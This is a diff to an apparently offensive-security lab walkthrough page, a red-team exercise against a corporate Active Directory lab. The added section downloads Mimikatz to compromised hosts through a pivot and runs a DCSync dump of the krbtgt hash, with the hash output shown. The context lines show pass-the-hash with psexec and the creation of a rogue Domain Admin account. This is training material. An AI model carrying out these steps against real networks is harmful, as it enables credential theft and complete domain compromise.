@@ -389,7 +389,7 @@ openvpn fake.ovpn
 ip a
 ```
 
-<figure><img src="../../.gitbook/assets/image (39).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (39) (3).png" alt=""><figcaption></figcaption></figure>
 
 **Kali**
 
@@ -1443,6 +1443,61 @@ proxychains /usr/local/bin/psexec.py Administrator@10.200.89.102 -hashes d3d4edc
 net user zepic pass123! /ADD /DOMAIN
 net localgroup Administrators zepic /add
 net group "Domain Admins" zepic /ADD /DOMAIN
+```
+
+## Download Mimikatz
+
+**Kali**
+
+```
+cp /opt/Mimikatz/x64/mimikatz.exe .
+python2 -m SimpleHTTPServer 81
+```
+
+**Victim(VPN)**
+
+```
+wget http://$KALI:81/mimikatz.exe
+sudo python2 -m SimpleHTTPServer 81
+```
+
+**Victim(CORPDC)**
+
+```
+wget http://10.200.89.12:81/mimikatz.exe -O mimikatz.exe
+.\mimikatz
+```
+
+**Victim(mimikatz)**
+
+```
+privilege::debug
+lsadump::dcsync /user:corp\krbtgt
+
+```
+
+**Output**
+
+<pre><code><strong>Credentials:
+</strong>  Hash NTLM: 0c757a3445acb94a654554f3ac529ede
+    ntlm- 0: 0c757a3445acb94a654554f3ac529ede
+    lm  - 0: d99b85523676a2f2ec54ec88c75e62e7
+</code></pre>
+
+Get SID of the domain
+
+**Victim(Powershell)**
+
+```
+Get-ADComputer -Identity "CORPDC"
+```
+
+Get SID of the Admininstrator account
+
+**Victim(Powershell)**
+
+```
+  Get-ADGroup -Identity "Enterprise Admins" -Server rootdc.thereserve.loc
 ```
 
 ## 10.200.89.201
